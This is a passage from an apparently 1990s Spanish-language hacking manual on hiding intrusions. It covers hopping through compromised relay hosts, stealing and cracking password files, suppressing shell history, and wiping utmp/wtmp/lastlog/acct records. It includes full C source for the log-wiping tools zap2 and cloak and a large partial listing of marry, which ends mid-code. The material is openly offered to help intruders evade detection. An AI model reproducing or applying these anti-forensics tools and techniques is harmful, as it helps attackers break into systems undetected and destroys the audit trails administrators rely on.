  del sistema dependiendo lo que hayas hecho. Te quitaran el sniffer, te
  quitaran si tienes sushi, si tienes alguna backdoor, etc.

        La manera de trabajar usando condon, consiste en usar maquinas
  intermedias para saltar de una en otra hasta llegar a la maquina objetivo.
  El esquema seria:

  Mimaquina-->Condon1-->Condon2-->Victima.com

        Ponemos el ejemplo de dos maquinas intermedias que sera suficiente
  para la mayoria de casos, pero lo que es cierto es que como las maquinas
  condon sean un poco lentas.. nos podemos morir de asco y de aburrimiento:o(

        En el ejemplo anterior, si en victima.com nos pillan, aparecemos con
  el ip de la maquina condon2 por lo que no sera la nuestra. Si quisieran
  pillarnos tendria que ir el root de la victima.com a hablar con el root de
  condon2 para convencerle de que le de tu ip ya que la maquina condon2
  tendra tu conexion en su log (siempre que no hayas borrado huellas en la
  maquina condon2, cosa que seria conveniente). Raramente un root de
  victima.com hablara con condon2 diciendole que les ha entrado un hacker y
  pidiendoles ayuda y sobre todo si una es de Japon y la otra de Noruega
  (jeje) pero en casos extremos todo esto se podria hacer legalmente por
  parte de la policia, pero tienes que hacer algo muy gordo para eso. Ademas,
  como se ha usado otra maquina condon1 se multiplican nuevamente todos los
  problemas para localizarte por lo que sera improbable si has borrado las
  huellas medianamente bien. El problema de esto es que si saltas a una
  makina de japon y luego a otra de noruega y luego a otra de espa§a, puedes
  tardar 10 minutos en que llegue a la destino si las intermedias van lentas:(

        Por ejemplo, si queremos hacer un telnet usando dos condones, el 
  procedimiento seria:

  % telnet condon1.com

        Te cuenta un rollo y te pide login y pass (que deben ser conocidos)
  UNIX v.4.5
  Login: aaaaaa
  Password: xxxxxx
        Te da acceso a esa maquina y haces otro telnet:
  % telnet condon2.com

        Te cuenta otro rollo y te pide login y pass
  IRIS v.3.5 Please Login
  Login: pepito
  Password: xxxx
  % telnet victima.com <---------Sistema con seguridad seria
        Te cuenta otro rollo y lo mismo:

  Login: porfinllego
  Password: xxxxxxxx
  Bienvenido!

        Y asi ya estamos en la maquina victima con 2 condones. Supongo que 
  entendeis el tema. Este procedimiento se puede usar con cualquier servicio: 
  telnet, ftp, etc.

        Es indispensable que las maquinas condon sean bastantes conocidas por
  el hacker, es decir, que sepas que el root no controla demasiado o que por
  algun motivo sabes que esta bajo tu control absoluto (aunque recuerdo que
  no siempre todo es como parece ser :o( porque quiza te pases de listo
  pensando que el root no tiene ni puta idea y resulta que te esta tomando el
  pelo), ya que como haya algun contratiempo puedes acabar en la carcel :o( o
  tambien seria una putada que el root de esa makina sea un tio competente (u
  otro hacker) y te este vigilando en todo lo que hagas y te este logeando
  todo lo que haces con los correspondientes inconvenientes.

        Sobre esto, he de decir que se debe tener en cuenta que hay
  administradores que controlan todos los aspectos del hacking y te pueden
  estar haciendo exactamente lo que piensas que le estas haciendo a el, es
  decir, el puede tener puestos troyanos para ocultar su presencia o para
  ocultar procesos suyos que te pueden estar logeando, pillais la idea no?..
  de hecho muchos hackers que conozco que son roots de maquinas usan este
  tipo de cosas... asi que tened cuidado ahi fuera ;o)

  9.- BORRAR HUELLAS

        En el apartado 8 se ha explicado como proteger que te localicen pero
  siempre ha de estar combinado el uso de condon con el borrado de huellas.

        El borrado de huellas es una de las tareas mas importantes cuando se
  entra en una maquina ya que si detectan que has entrado se mosquearan y
  buscaran como conseguir eliminarte y aunque el root no se entere mucho,
  siempre puede pedirle a alguien ayuda y que te descubran los troyanos,
  rootkits y demas ingenios maleficos..:( .. por esto, lo mejor es que no
  detecten que has entrado y esto se consigue borrando las huellas tal y como
  se explica a continuacion.

        El problema del borrado de huellas es que para borrar poder borrar
  todas las huellas has de ser root (excepto algunos sunos que se podia
  modificar un fichero de log aunke no todos) y ademas en algunos sistemas
  con sistemas adicionales de logs o de seguridad borrar todas las huellas se
  puede convertir en una tarea compleja.

        Un consejo particular es que el hackeo de la maquina, a ser posible,
  es mejor hacerlo todo de una. Es decir, que si por ejemplo consigues el
  fichero de passwd con un bug remoto (por ejemplo el phf), eso deja logs en
  el httpd por lo que lo mas interesante es pillar el fichero de passwd y
  desencriptarlo con el john (o si pillas una shell remota no necesitas
  desencriptar), entrar e intentar hacerte root para poder borrar las
  huellas... todo de un tiron.

        Os podeis preguntar que si no es mas comodo hacerlo en varios dias..
  la respuesta es que es mas comodo hacerlo en varios dias, pero tened en
  cuenta que si por ejemplo pillais el fichero de passwd con el phf un lunes
  noche, y hasta el jueves no os poneis de nuevo con la maquina, el root
  puede haber visto los logs del httpd en martes y darse cuenta de que tiene
  un hacker rondando... una putada no?... sin embargo, si el mismo lunes,
  entrais usando el phf, rulais xploits y os haceis root y usais las tecnicas
  explicadas en esta seccion para borrar huellas, sereis roots y ademas no
  tendra manera de detectarlo... esta bien no??

        Por cierto, aunque no venga mucho al caso, aconsejo que al entrar en
  una maquina, antes de hacer cosas, hagais un who.. aunque tened en cuenta
  que hay que saber interpretar los resultados del who ya que a veces pueden
  estar semi-adulterados.

        Otra cosa es que hay que ser un poco cuidadoso con lo que se hace. Hay 
  mucha gente que sube los xploits a las maquinas y los zappers y luego no se 
  preocupan ni de borrarlos ni de nada.. opino que tampoco cuesta mucho meter 
  todos los xploit en un directorio .xploit y antes de irte hacer un rm -r
  .xploit... es ke da un poko de pena ir por una makina y encontrartela llena
  de xploits y de ficheros de passwd por los homes de los usuarios :(

        En fin, vamos al grano... los sistemas operativos llevan por defecto
  bastantes logs (log es un archivo que guarda informacion) : en los textos
  que he mirado por ahi la mayoria hablan del wtmp, utmp y lastlog y algunos
  hablan sobre el acct, pero en realidad hay que tener cuidado con algunos
  logs mas como pueda ser el que registra las entradas por ftp, todos los que
  genera el syslogd, los del httpd, etc.

        Ademas para joder mas, existen programas especificos para ejercer
  tareas adicionales como puedan ser el tripwire (comprobador de binarios),
  tcp-wrappers, log daemons adicionales, etc pero en fin... todo esto lo
  dejaremos para otro texto que vienen los examenes pronto y tengo poco
  tiempo jeje 

        Bien, seas o no seas root, has de tener cuidado con el history. El
  history es un archivo que guarda todos los comandos que ejecutas y que por
  ejemplo en la bash se llama .bash_history.

        Para evitar que se haga el history tienes varias alternativas:

  unset history
  o
  poner un set y hacer algo del tipo HISTFILE=/dev/null
  o
  ln -s /dev/null /.bash_history (suponiendo que estamos en bash shell)

        El sistema que yo uso es ejecutar una csh ke no deja archivo history
  kon lo ke te olvidas de este problema :)

        Otra historia para tener en cuenta es que si entras en la tipica
  maquina que te dice quien fue el ultimo usuario que entro a esa cuenta,
  podria ser sospechoso si entras a una maquina alemana y ve que

  Lastlogin by pepito.es 23-01-1997

        Opino que seria mosqueante no?... asi que si no conseguimos ser root y 
  podemos borrarlo con el cloak o similar, lo que tenemos que hacer es un
  telnet maquinavictima.de y asi cuando entre la siguiente persona vera:

  Lastlogin by maquinavictima.de 23-01-1997

        Que aunque no es perfecto, es mejor que en el caso anterior no?

        Ademas de esto, se ha de tener en cuenta que muchas veces lo que
  hagamos en la maquina creara ficheros en el /tmp por lo que habra que darse
  una vuelta por alli antes de salir de la maquina y borrar si hemos generado
  algo... identificaremos rapidamente lo ke hemos generado nosotros por el
  propietario de los ficheros.

        En fin, todo lo explicado hasta ahora es suponiendo que no hemos
  conseguido root, pero si pillamos el root, casi siempre podremos borrar
  todas las huellas aunque tambien hemos de tener mas cuidado ya que si no
  las borramos bien y el verdadero root entra a la maquina y ve que alguien
  hizo modificaciones como root un dia que el no estuvo (y que estuvimos
  nosotros), se mosqueara bastante y le dara que pensar.... y posiblemente te
  pille o cambie las cuentas del sistema o haga cualquier cosa.

        La idea es que si entramos como login pepito, el root no puede saber
  si pepito es realmente pepito o no y no tiene manera de comprobarlo pero
  sin embargo el root si que sabe aproximadamente que dias se conecto por lo
  que si al hacer un last ve que se conecto por ejemplo el jueves 24 de enero
  y resulta que ese dia estaba con la novia...... pensando llegaria a la
  conclusion de que alguien entro a la maquina como root...... asi la
  conclusion es que cuando nos hagamos root hay que tener cuidado en borrar
  las huellas (este tipo de cosas puede parecer obvio pero siempre es bueno
  recordarlas no?). Tambien hay que tener en cuenta que si entras como user
  normal y ejecutas un xploit, en la mayoria de los casos tu uid no sera el
  de root pero tendras privilegios de root por lo que el root haciendo un
  last no detectara que ha entrado alguien kon privilegios de root.. aunke se
  puede dar kuenta por otros detalles.

        En fin, los logs mas importantes son:

        UTMP - Indica quien esta conectado en cada momento.

        WTMP - Indica todas las entradas y salidas de la maquina victima
  indicando el tty y el host.

        LASTLOG - Guarda un log indicando el momento exacto en el que se
  conecto el usuario por ultima vez.

        ACCT - Guarda todos los comandos ejecutados por los usuarios (aunque
  sin argumentos) y como os podreis imaginar eso se hace un log enorme en un
  rato por lo que no suele estar activo, pero siempre hay que tener en cuenta
  que puede estar activo y que es una putada porque logea todo lo que haces.
  En general, la mayoria de los zappers tienen opciones para borrar el acct asi
  ke no hay problemas. De todos modos, zhart (thc) hizo un programa ke sirve
  para borrar las huellas del acct ke esta bastante bien y ke lo puedes
  enkontrar en la red :)

        Y estan ubicadas en los siguientes directorios:

        UTMP : /etc o /var/adm o /usr/adm o /usr/var/adm o /var/log

        WTMP : /etc o /var/adm o /usr/adm o /usr/var/adm o /var/log

        LASTLOG :  /usr/var/adm o /usr/adm o /var/adm o /var/log

        ACCT :   /var/adm/acct ( en algunos sistemas se puede llamar pacct )

        Para borrar estas huellas, se puede usar el zap2 que lo adjunto ya que
  es muy usado aunque si lo usas has de saber que puede ser detectado
  facilmente con distintos programas ya que no borra tus huellas sino que las
  sustituye por ceros y ademas no borra el acct por lo que es mejor que uses
  el cloak que pondre a continuacion.

        En ambos codigos, tendras que poner la ubicacion exacta del utmp,
  wtmp, lastlog y en su caso acct que podras encontrar en uno de los
  directorios que he comentado anteriormente o simplemente los buscas con
  find / -name nombre.

        Bien, aqui va el zap2 cuyo uso es zap2 nombredeusuario :

------------ Codigo Fuente ---------------------------------------------------

#include <sys/types.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/file.h>
#include <fcntl.h>
#include <utmp.h>
#include <pwd.h>
#include <lastlog.h>
#define WTMP_NAME "/usr/adm/wtmp"
#define UTMP_NAME "/etc/utmp"
#define LASTLOG_NAME "/usr/adm/lastlog"
 
int f;
 
void kill_utmp(who)
char *who;
{
    struct utmp utmp_ent;
 
  if ((f=open(UTMP_NAME,O_RDWR))>=0) {
     while(read (f, &utmp_ent, sizeof (utmp_ent))> 0 )
       if (!strncmp(utmp_ent.ut_name,who,strlen(who))) {
                 bzero((char *)&utmp_ent,sizeof( utmp_ent ));
                 lseek (f, -(sizeof (utmp_ent)), SEEK_CUR);
                 write (f, &utmp_ent, sizeof (utmp_ent));
            }
     close(f);
  }
}
 
void kill_wtmp(who)
char *who;
{
    struct utmp utmp_ent;
    long pos;
 
    pos = 1L;
    if ((f=open(WTMP_NAME,O_RDWR))>=0) {
 
     while(pos != -1L) {
        lseek(f,-(long)( (sizeof(struct utmp)) * pos),L_XTND);
        if (read (f, &utmp_ent, sizeof (struct utmp))<0) {
          pos = -1L;
        } else {
          if (!strncmp(utmp_ent.ut_name,who,strlen(who))) {
               bzero((char *)&utmp_ent,sizeof(struct utmp ));
               lseek(f,-( (sizeof(struct utmp)) * pos),L_XTND);
               write (f, &utmp_ent, sizeof (utmp_ent));
               pos = -1L;
          } else pos += 1L;
        }
     }
     close(f);
  }
}
 
void kill_lastlog(who)
char *who;
{
    struct passwd *pwd;
    struct lastlog newll;
 
     if ((pwd=getpwnam(who))!=NULL) {
 
        if ((f=open(LASTLOG_NAME, O_RDWR)) >= 0) {
            lseek(f, (long)pwd->pw_uid * sizeof (struct lastlog), 0);
            bzero((char *)&newll,sizeof( newll ));
            write(f, (char *)&newll, sizeof( newll ));
            close(f);
        }
 
    } else printf("%s: ?\n",who);
}
 
main(argc,argv)
int argc;
char *argv[];
{
    if (argc==2) {
        kill_lastlog(argv[1]);
        kill_wtmp(argv[1]);
        kill_utmp(argv[1]);
        printf("Zap2!\n");
    } else
    printf("Now...that was as bad as shit!\n");
}

------------ FIN -------------------------------------------------------------

        Bien, ya he puesto el zap2.. ahora pongo el cloak que es el que hay
   que usar ya que borra mejor las huellas y ademas se encarga del acct:

------------ Codigo Fuente ---------------------------------------------------

/*
 *      C L O A K
 *
 *      Wrap yourself in a cloak of darkness (heh heh heh).
 *
 *      Michael S. Baldwin,  Matthew Diaz  1982
 *
 *      Marcus J. Ranum - 1983 - complete re-write and munging
 *      added more options, and all kinds of evil - including the
 *      ability to vanish from wtmp and acct as well as utmp. Added more
 *      error checking and useful command syntax. Now you can attribute
 *      all *YOUR* CPU usage to others when playing hack !!!
 *
 */
 
 
#include <stdio.h>
#include <sys/types.h>
#include <utmp.h>
#include <pwd.h>
#include <lastlog.h>
#include <sys/file.h>
#include <sys/acct.h>
 
/* set these guys. If you're sysV a port should be easy */
#define UTMP    "/etc/utmp"
#define WTMP    "/usr/adm/wtmp"
#define LAST    "/usr/adm/lastlog"
#define ACCT    "/usr/adm/acct"
 
 
main(ac,av)
int     ac;
char    *av[];
{
        char    *tp     = "";
        char    *un     = "";
        char    *hn     = "";
        char    *pn     = "";
        long    newt    = 0L;
        int     wflg    = 0;
        int     aflg    = 0;
        int     refs    = 1;
        int     x;              /* klunch */
        char    *p;
        extern  char    *index();
        extern  time_t  time();
 
        for(x = 1; x < ac; x++) {
                if(av[x][0] == '-')
                        switch(av[x][1]) {
			case 'u':       /* username to be :-) */
                                        if((x + 1) < ac)
                                                un = av[++x];
                                        break;
 
                                      case 't':    /* tty slot to be on :-) */
                                        if((x + 1) < ac)
                                                tp = av[++x];
                                        break;
 
                                      case 'h':   /* host name to be on :-) */
                                        if((x + 1) < ac)
                                                hn = av[++x];
                                        break;
 
                                      case 'r':   /* # of refs to zap :-) */
                                        if((x + 1) < ac)
                                                refs = atoi(av[++x]);
                                        break;
 
				      case 's':
                                        execl("/bin/sh","sh",0);
                                        perror("exec");
                                        exit(1);
 
                                      case 'w':    /* vanish from wtmp, too */
                                        wflg++;
                                        break;
 
                                      case 'a':    /* vanish from acct, too */
                                        aflg++;
                                        break;
 
                                      case 'p':/* specific program for acct */
                                        if((x + 1) < ac)
                                                pn = av[++x];
                                        break;
 
				      case 'l':       /* log on time */
                                        if((x + 1) >= ac)
                                                break;
                                        newt = atoi(p = av[++x]);
                                        if(p = index(p,':'))  {
                                                newt *= 60;
                                                newt += ((newt > 0) ? 1 : -1)*
atoi(++p);
					      }
                                        newt *= 60;
                                        newt += time((long *)0L);
                                        break;
 
				      default:
                                        exit(usage());
				      }
 
	      }
 
        if(wflg && wtmpzap(tp,un,hn,newt,refs))
                perror(av[0]);
 
        if(aflg && acctzap(un,pn))
                perror(av[0]);
 
        if(utmpzap(tp,un,hn,newt)) {
                perror(av[0]);
                exit(1);
	      }
 
        if(lastzap(tp,un,hn,newt)) {
                perror(av[0]);
                exit(1);
	      }
 
        exit(0);
      }
 
utmpzap(tt,un,hn,tim)
char    *tt;
char    *un;
char    *hn;
long    tim;
{
        int     fd;
        int     slot;
        struct  utmp    ubuf;
        extern  time_t  time();
        extern  char    *strncpy();
        extern  long    lseek();
 
        if((slot = ttyslot()) == 0) {
                (void)fprintf(stderr,"No tty slot");
                return(-1);
	      }
 
        if((fd = open(UTMP,O_RDWR)) == -1 )
                return(-1);
 
        if(lseek(fd,(long)(slot * sizeof(ubuf)),0) < 0) {
                (void)close(fd);
                return(-1);
	      }
 
        if(read(fd,(char *)&ubuf,sizeof(ubuf)) != sizeof(ubuf)) {
                (void)close(fd);
                return(-1);
	      }
 
        if(tim)
                ubuf.ut_time = tim;
        else
                ubuf.ut_time = time((long *)0L);
 
        (void)strncpy(ubuf.ut_name,un,sizeof(ubuf.ut_name));
 
        if(!tt[0] == '\0')
                (void)strncpy(ubuf.ut_line,tt,sizeof(ubuf.ut_line));
                (void)strncpy(ubuf.ut_host,hn,sizeof(ubuf.ut_host));
 
        if(lseek(fd,(long)(-sizeof(ubuf)), 1) < 0) {
                (void)close(fd);
                return(-1);
	      }
 
        if(write(fd,(char *)&ubuf,sizeof(ubuf)) != sizeof(ubuf)) {
                (void)close(fd);
                return(-1);
	      }
 
        return(close(fd));
      }
 
wtmpzap(tt,un,hn,tim,refs)
char    *tt;
char    *un;
char    *hn;
long    tim;
int     refs;
{
        int     fd;
        char    *p;
        char    tbuf[40];
        struct  utmp    ubuf;
        extern  char    *strncpy();
        extern  char    *strcpy();
        extern  char    *rindex();
        extern  char    *ttyname();
        extern  long    lseek();
        extern  time_t  time();
 
        if((p = ttyname(0)) != NULL)
                (void)strcpy(tbuf,p);
        else
                return(0);
 
        /* figure out our device name */
        p = rindex(tbuf,'/');
        if(p == NULL)
                p = tbuf;
        else
                p++;
 
 
        if((fd = open(WTMP,O_RDWR)) == -1 )
                return(-1);
 
        if(lseek(fd,0L,2) < 0)
                return(-1);
 
 
        /* this is gross, but I haven't a better idea how it can */
        /* be done - so who cares ? */
 
        while(refs) {
                if((lseek(fd,(long)(-sizeof(ubuf)),1)) < 0) {
                        (void)close(fd);
                        return(0);
		      }
 
                if(read(fd,(char *)&ubuf,sizeof(ubuf)) != sizeof(ubuf)) {
                        (void)close(fd);
                        return(0);
		      }
                if(!strcmp(p,ubuf.ut_line)) {
                        if(tim)
                                ubuf.ut_time = tim;
                        else
                                ubuf.ut_time = time((long *)0L);
 
                        (void)strncpy(ubuf.ut_name,un,sizeof(ubuf.ut_name));
                        (void)strncpy(ubuf.ut_host,hn,sizeof(ubuf.ut_host));
 
                        if(!tt[0] == '\0')
 
(void)strncpy(ubuf.ut_line,tt,sizeof(ubuf.ut_line));
 
                        if(lseek(fd,(long)(-sizeof(ubuf)),1) < 0) {
                                (void)close(fd);
                                return(0);
			      }
 
                        if(write(fd,(char *)&ubuf,sizeof(ubuf)) !=
sizeof(ubuf)){
                                (void)close(fd);
                                return(0);
			      }
 
                        if(lseek(fd,(long)(-sizeof(ubuf)),1) < 0) {
                                (void)close(fd);
                                return(0);
			      }
 
                        refs--;
   }
 
                if(lseek(fd,(long)(-sizeof(ubuf)),1) < 0) {
                        (void)close(fd);
                        return(0);
   }
 
   }
 
        return(close(fd));
   }
 
acctzap(un,pn)
char    *un;
char    *pn;
{
        int     fd;
        int     faku =0;
        int     realu;
        struct  acct    actbuf;
        struct  passwd  *pwt;
        extern  struct  passwd  *getpwnam();
 
        if((fd = open(ACCT,O_RDWR)) == -1 )
                return(-1);
 
        realu = getuid();
 
        if(un[0] != '\0' && ((pwt = getpwnam(un)) != NULL))
                faku = pwt->pw_uid;
 
        while(1) {
                if(read(fd,(char *)&actbuf,sizeof(actbuf)) != sizeof(actbuf)){
                        (void)close(fd);
                        return(0);
		      }
 
                if(realu == actbuf.ac_uid) {
 
                        /* only zap a specific program to user */
                        if(pn[0] != '\0' && strcmp(pn,actbuf.ac_comm))
                                continue;
 
                        actbuf.ac_uid = faku;
                        actbuf.ac_flag &= ~ASU;
                        if(lseek(fd,(long)(-sizeof(actbuf)),1) < 0) {
                                (void)close(fd);
                                return(0);
			      }
 
                        if(write(fd,(char *)&actbuf,sizeof(actbuf)) !=
sizeof(actbuf)){
                                (void)close(fd);
                                return(0);
			      }
		      }
	      }
      }
 
usage()
{
#ifdef USAGE
        (void)fprintf(stderr,"usage: cloak <options>\n");
        (void)fprintf(stderr,"options are:\t-l <+->hh:mm (login time)\n");
        (void)fprintf(stderr,"\t\t-u username\t\t\t-t ttyname\n");
        (void)fprintf(stderr,"\t\t-w (clobber wtmp)\t\t-r #of refs to
clobber\n");
        (void)fprintf(stderr,"\t\t-h host\t\t-a (clobber accounting)\n");
        (void)fprintf(stderr,"\t\t-p program (attribute only program to
acct)\n");
        (void)fprintf(stderr,"(no args causes a simple vanishing act)\n");
#endif
        return(1);
      }
 
lastzap(tt,un,hn,tim)
char    *tt;
char    *un;
char    *hn;
long    tim;
{
        int     fd;
        int     uid;
        struct  lastlog lbuf;
        extern  time_t  time();
        extern  char    *strncpy();
        extern  long    lseek();
 
        uid = getuid();
 
        if((fd = open(LAST,O_RDWR)) == -1 )
                return(-1);
 
        if(lseek(fd,(long)(uid * sizeof(lbuf)),0) < 0) {
                (void)close(fd);
                return(-1);
	      }
 
        if(read(fd,(char *)&lbuf,sizeof(lbuf)) != sizeof(lbuf)) {
                (void)close(fd);
                return(-1);
	      }
 
        if(tim)
                lbuf.ll_time = tim;
        else
                lbuf.ll_time = time((long *)0L);
 
        if(!tt[0] == '\0')
                (void)strncpy(lbuf.ll_line,tt,sizeof(lbuf.ll_line));
        (void)strncpy(lbuf.ll_host,hn,sizeof(lbuf.ll_host));
 
        if(lseek(fd,(long)(-sizeof(lbuf)), 1) < 0) {
                (void)close(fd);
                return(-1);
	      }
 
        if(write(fd,(char *)&lbuf,sizeof(lbuf)) != sizeof(lbuf)) {
                (void)close(fd);
                return(-1);
	      }
 
        return(close(fd));
      }
}

------------ FIN -------------------------------------------------------------

        Ademas de estos, habria ke mencionar otros como el wipe, marry,
  remove, clean, etc... algunos de los kuales estan bastante bien. Adjunto
  tambien el marry ya ke ofrece algunas posibilidades interesantes y se usa
  bastante (borra tambien acct):

------------ Codigo Fuente ---------------------------------------------------

/*marry v1.1 (c) 1991 -- Proff -- proff@suburbia.apana.org.au,
 *All rights reserved.
 *
 *May there be peace in the world, and objectivity amoung men.
 *
 *You may not use this program for unethical purposes. 
 *
 *You may not use this program in relation to your employment, or for monetary
 *gain without express permission from the author.
 *
 * usage:  
 * marry [-aetsuScDn] [-i src] [-o obj] [-d dump] [-p pat] [-v pat] [-m [WLA]]
 *         [-E editor] [-h program] [-b backup ]
 *
 *   -a     automode, dump, run editor over dump and re-assemble to object
 *   -e     edit source, assemble directly to input file, imples no insertion
 *          of records before an equal quantity of deltion
 *   -t     truncate object to last line of dump source when assembling
 *   -s     squeeze, delete all record in input not occuring in dump
 *          (higher entries in input will be appended unless -t is also 
 *          specified)
 *   -u     when in [L]astlog mode do user-id -> name lookups (time consuming)
 *   -S     Security, when in [A]cct and -[a]uto mode replace editor's acct
 *          record with an unmodified random previous entry, detach from 
 *          terminal, SIGKILL ourselves or execlp [-h program] to hide our
 *          acct record (marry should be exec'ed under these circumstances)
 *   -c     clean, delete backup and dump files once complete
 *   -D     Delete our self once complete (i.e argv[0])
 *   -n     no backups, don't make backups when in -e, -a modes or when
 *          -i file == -o file
 *   -i src input, the utmp, wtmp, lastlog or p/acct file concerned. defaults
 *          o the system wtmp/lastlog/pacct depending on mode if not specified
 *   -o obj output, the dump assembled and input merged version of the
 *          above. if given and not in -[a]uto mode, implies we are 
 *          assembling, not dumping. 
 *   -d dump  dump, the dump (editable representation of src) file name. this
 *            is is either an input (-o specified) an output (no -o) or both
 *            -[a]uto. defaults to "marry.dmp" in the current directory if not
 *            specified
 *   -p pat  pattern match. When disassembling (dumping), only extract records
 *           which match (checked against all string fields, and the uid if
 *           the pattern is a valid username)
 *   -v pat    inverse pattern match. like egrep -v. above non-logic features.
 *   -m mode   mode is one of:
 *
 *			W  -  utmp/wtmp (or utmpx/wtmpx see UTMPX #define)
 *                      L  -  lastlog
 *                      A  -  acct/pacct
 *  
 * -E editor  editor to be used in -[a]uto mode. defaults to /usr/bin/vi. must
 *            be the full path in -[S]ecurity mode (we do some clever
 *            symlinking)
 * -h program hide, if -S mode is on, then attempt to conceal our acct entry
 *            by execlp'ing the specified program. this seems to work on BSD
 *            derived systems. with others, your might want to just call marry
 *            something innocous.
 *   -b backup  name of backup file, defaults to "marry.bak"
 * 
 *   the following instruction codes can be placed in position one of the dump
 *   lines to be assembled (e.g "0057a" -> "=057a"):
 *
 *   '='	tag modification of entry. 
 *   '+'	tag insertion of entry
 *
 * Examples:
 *
 * $ marry -mW -i /etc/utmp -s -a  # dump, edit, re-assemble and strip deleted
 *                                 # entries from utmp
 *  
 * $ marry -mL -u -a -n -e        # dump lastlog with usernames, edit, make no
 *                                # backups and re-assemble in-situ directly to
 *                                # lastlog
 *
 * $ marry -mW -a -p mil -E emacs     # dump all wtmp entries matching "mil", 
 *                                      edit
 *                              # with emacs, re-assemble and re-write to wtmp
 *
 * $ exec marry -mA -SceD 		# dump all acct entries by root, edit, 
 *                                        remove
 * -h /usr/sbin/in.fingerd       # editor's acct record, re-assemble directly
 * -p root -a -i /var/account/acct  # to acct in-situ, delete backup and dump
 *                                    file,
 *                               # delete ourself from the disk, unassign our
 *                               # controling terminal, and lastly overlay our
 *                               # self (and thus our to be acct record) with
 *                               # in.fingerd
 */

#define UTMP
#undef UTMPX /* solaris has both */
#define LASTLOG
#define PACCT

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/time.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <signal.h>
#include <pwd.h>
#include <grp.h>
#include <errno.h>

#ifdef __SVR3
#  include <getopts.h>
#endif
#ifndef bsd
#  if defined(__NetBSD__) || defined(bsdi) || defined(BSDI) || 
defined(__386BSD__)
#    define bsd
#  endif
#endif

#if !defined(gcc)
#  define NO_VOID /* non gcc, early compiliers */
#endif

#ifndef __SVR3
extern char *optarg; 
#endif

#ifdef NO_VOID
#  define VOID int
#  define FVOID
#else 
#  define VOID void
#  define FVOID void
#endif

#ifndef bool 
#  define bool char
#endif

#define match(a,b) (match_s((a), (b), sizeof(a)))

#ifdef UTMP
#ifdef UTMPX
#  include <utmpx.h>
#  define S_UTMP utmpx
#  define UT_HOST ut_host
#  define UT_ID ut_id
#  define UT_TYPE ut_type
#  define UT_PID ut_pid
#  define UT_TV ut_tv
#  ifdef _PATH_WTMPX
#    define WTMP_FILE _PATH_WTMPX
#  else
#    ifdef WTMPX_FILE
#      define WTMP_FILE WTMPX_FILE
#    else
#      define WTMP_FILE "/usr/adm/wtmpx"
#    endif
#  endif
#else
#  include <utmp.h>
#  define S_UTMP utmp
#  ifndef WTMP_FILE
#    ifdef _PATH_WTMP
#      define WTMP_FILE _PATH_WTMP
#    else
#      define WTMP_FILE "/usr/adm/wtmp"
#    endif
#  endif
#  if !defined(ut_name) && !defined(ut_user)
#    define ut_user ut_name
#  endif
#  if defined(linux) || defined(bsd) || defined(sun)
#    define UT_HOST ut_host
#  endif
#  ifdef linux
#    define UT_ADDR ut_addr
#  endif
#  define UT_TIME ut_time
#  if defined(linux) || defined(solaris)
#    define UT_PID  ut_pid
#    define UT_ID   ut_id
#  endif
#  if defined(linux) || defined(solaris) || defined(sysv) || defined(SYSV) || 
defined(SVR4)
#    define UT_TYPE ut_type
#  endif
#endif
#endif

#ifdef LASTLOG
#  ifdef bsd
#    ifndef UTMP
#      include <utmp.h>
#    endif
#  else
#    include <lastlog.h>
#  endif
#  ifndef LASTLOG_FILE
#    ifdef _PATH_LASTLOG
#      define LASTLOG_FILE _PATH_LASTLOG
#    else
#      define LASTLOG_FILE "/usr/adm/lastlog"
#    endif
#  endif
#  define LL_HOST ll_host
#endif

#ifdef PACCT
#  include <sys/acct.h>
#  ifdef bsd
#    define PACCT_FILE "/var/account/acct"
#  else
#    define PACCT_FILE "/usr/adm/pacct"
#  endif
#endif

#ifdef UT_ADDR
#  include <arpa/inet.h>
#endif

FILE *ofh, *ifh, *afh;

#ifdef UTMP
struct S_UTMP s_utmp;
#endif
#ifdef LASTLOG
struct lastlog s_lastlog;
#endif
#ifdef PACCT
struct acct s_acct;
struct acct ac_saved;
int acct_step;
#endif
char ac_comm_hide[32];

struct passwd *uid;
struct passwd uid_s;
char **uida=NULL;
char **gida=NULL;

#define MAX_UID 65537

char *quotes="\"\"";

int globline=0;

char *a_Input=NULL;
char *a_Output=NULL;
char *a_Pattern=NULL;
char *a_Hide=NULL;
#ifdef sun
char *a_Editor="/usr/ucb/vi";
#else
char *a_Editor="/usr/bin/vi";
#endif
char *a_Dump="marry.dmp";
char *a_Backup="marry.bak";
bool f_Auto=0;
bool f_Squeeze=0;
bool f_EditSrc=0;
bool f_Truncate=0;
bool f_Exclude=0;
bool f_Uid=0;
bool f_Security=0;
bool f_Clean=0;
bool f_DeleteSelf=0;
bool f_NoBackups=0;
bool f_backedup;
char mode;

int mode_size=0;
void *mode_data;

int globline;
char *mes;
time_t otime=0;
FVOID display()
{
static int n;
time_t t;
	globline++;
	if (n++<30) return; /* don't want too many context switches */
	n=0;
	time(&t);
	if (t<(otime+1)) return;
	otime=t;
	printf("%s%d\r", mes, globline);
	fflush(stdout);
}
FVOID display_end()
{
	printf("%s%d\n", mes, globline);
	fflush(stdout);
}

#ifdef NO_VOID
char
#else
void
#endif
*
Smalloc(n)
int n;
{
#ifdef NO_VOID
char
#else
void
#endif
* p;
	while (!(p=malloc(n))) sleep(1);
	return p;
}

bool copyf(src, dst)
char *src;
char *dst;
{
#define CBUFLEN 128*1024
int fi, fo;
char *buf;
int cc;
	if ((fi=open(src, O_RDONLY, 0))<0)
	{
		perror(src);
		exit(1);
	}
	if ((fo=open(dst, O_WRONLY|O_CREAT|O_TRUNC, 0666))<0)
	{
		perror(dst);
		exit(1);
	}
	buf=Smalloc(CBUFLEN);
	while ((cc=read(fi, buf, CBUFLEN))>0)
		if (write(fo, buf, cc)!=cc)
		{
			perror(dst);
			exit(1);
		}
	close(fo);
	close(fi);
	free(buf);
	return 1;
}

bool backup(src)
char *src;
{
	printf("backup = %s\n", a_Backup);
	fflush(stdout);
	return copyf(src, a_Backup);
}

char *match_s(haystack, needle, n)
char *haystack;
char *needle;
int n;
{
static char tmp[256];
	strncpy(tmp, haystack, n>sizeof(tmp)? sizeof(tmp): n);
	return strstr(tmp, needle);
}

unsigned short atoi2(s)
char *s;
{
	return (s[0]-'0')*10+(s[1]-'0');
}

char *p_string(s, size)
char *s;
int size;
{
static char sss[1024];
register int n;
char *ss=sss;
	if (!*s) return quotes;
	
	for (n=0; n<size; n++)
	{
		char c=s[n];
		switch (c)
		{
